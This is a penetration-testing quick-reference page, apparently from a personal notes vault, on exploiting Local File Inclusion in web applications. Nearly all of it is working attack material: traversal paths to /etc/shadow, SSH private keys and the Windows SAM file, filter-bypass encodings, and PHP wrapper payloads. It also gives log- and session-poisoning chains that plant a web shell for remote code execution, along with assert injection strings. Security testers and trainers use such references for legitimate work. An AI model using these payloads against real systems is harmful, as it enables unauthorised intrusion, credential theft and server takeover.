# LFI — Local File Inclusion Quick Reference

**Tags:** #lfi #web #exploitation #php
**Related Playbook:** [[05-Exploitation/Web-Apps]]

---

## Basic Payloads

```bash
# Linux targets
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../etc/crontab
../../../../proc/self/environ
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../var/log/auth.log
../../../../home/$USER/.ssh/id_rsa
../../../../root/.ssh/id_rsa
../../../../root/.bash_history

# Windows targets
..\..\..\..\..\Windows\System32\drivers\etc\hosts
..\..\..\..\..\Windows\win.ini
..\..\..\..\..\Windows\System32\config\SAM
..\..\..\..\..\inetpub\wwwroot\web.config
..\..\..\..\..\xampp\htdocs\config.php
```

## Filter Bypass

```bash
# Double encoding
%252e%252e%252f%252e%252e%252f   # = ../../../
..././..././                      # Strips ../ once, leaves ../

# Null byte (PHP < 5.3)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Path normalization
/./etc/passwd
//etc/passwd

# URL encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## PHP Wrappers

```bash
# Read source code (base64-encoded)
php://filter/convert.base64-encode/resource=config.php
# Decode: echo "BASE64" | base64 -d

# Read with rot13
php://filter/string.rot13/resource=/etc/passwd

# RCE via php://input (if allow_url_include=On)
# POST body: <?php system($_GET['cmd']); ?>
curl -X POST "http://$TARGET/page.php?page=php://input" -d '<?php system("id"); ?>'

# data:// RCE
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

## LFI → RCE via Log Poisoning

```bash
# 1. Inject PHP code into User-Agent
curl -s -A "<?php system(\$_GET['cmd']); ?>" http://$TARGET/

# 2. Include the log file
curl "http://$TARGET/page.php?page=../../../../var/log/apache2/access.log&cmd=id"

# Nginx log
curl "http://$TARGET/page.php?page=../../../../var/log/nginx/access.log&cmd=id"

# SSH auth log (inject via username)
ssh '<?php system($_GET["cmd"]);?>'@$TARGET
curl "http://$TARGET/page.php?page=../../../../var/log/auth.log&cmd=id"
```

## LFI → RCE via PHP Session

```bash
# 1. Set session cookie with PHP code
curl -s -c cookies.txt "http://$TARGET/login.php" -d 'user=<?php system($_GET["cmd"]); ?>'
# Get PHPSESSID from cookies.txt

# 2. Include session file
curl "http://$TARGET/page.php?page=../../../../var/lib/php/sessions/sess_PHPSESSID&cmd=id"
```

## Assert-based LFI (PHP)

```bash
# If page parameter is used in assert()
' and die(show_source('/etc/passwd')) or '
' and die(system('id')) or '
```

## Tools

```bash
# LFImap
python3 lfimap.py -U "http://$TARGET/page.php?file=FILE" --all

# LFISuite
python2 lfisuite.py

# ffuf for LFI discovery
ffuf -u "http://$TARGET/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

## Related Notes

- [[05-Exploitation/Web-Apps]] — Web exploitation workflow
- [[00-Quick-Reference/Reverse-Shells]] — Shells to deploy after RCE
